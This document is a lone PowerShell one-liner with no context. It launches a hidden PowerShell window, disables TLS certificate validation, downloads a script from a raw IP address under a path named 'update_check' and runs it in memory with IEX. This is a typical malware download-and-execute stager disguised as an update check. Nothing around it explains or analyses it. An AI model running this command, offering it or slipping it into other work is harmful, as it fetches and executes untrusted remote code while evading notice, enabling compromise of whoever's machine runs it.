powershell.exe -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX ((new-object net.webclient).downloadstring('https://40.124.9.139:443/update_check'))"
